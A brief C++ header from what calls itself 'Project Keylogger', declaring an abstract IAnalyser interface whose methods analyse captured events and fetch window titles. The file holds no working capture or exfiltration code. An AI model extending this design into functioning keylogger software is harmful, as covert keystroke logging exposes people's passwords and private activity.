/**
* Project Keylogger
*/

#ifndef									_IANALYSER_H
#define									_IANALYSER_H

#include								"AEvent.h"

class IAnalyser
{
public:

	virtual std::string&				analysis(AEvent*) = 0;
	virtual std::string&				getWindowTitle(AEvent*) = 0;

};

#endif